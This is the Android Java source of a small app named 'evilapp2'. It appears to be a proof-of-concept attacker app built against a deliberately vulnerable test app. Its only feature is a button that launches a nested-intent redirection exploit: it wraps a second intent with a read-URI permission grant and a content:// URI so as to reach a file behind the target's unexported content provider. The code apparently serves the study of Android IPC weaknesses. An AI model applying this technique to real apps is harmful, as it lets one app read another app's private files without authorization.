package com.example.evilapp2;

import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.layout_mainactivty);


        findViewById(R.id.doTheThing).setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "com.maliciouserection.axolotl",
                    "com.maliciouserection.axolotl.example.activity.contentProvider.unexportedContentProvider"
            ));

            Intent intent2 = new Intent();
            intent2.putExtra("theWorstStringEver!", "yaystringyay");
            intent2.putExtra("theWorstIntEver!", 420);
            intent2.setData(Uri.parse("content://com.maliciouserection.axolotl.provider.testprovider/_exampleFile1.txt"));
            intent2.setComponent(new ComponentName("com.example.evilapp2", "com.example.evilapp2.IntentProxyContentProviderHelper"));
            intent2.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.putExtra("theWorstIntentEver!", intent2);

            startActivity(intent);

        });

    }
}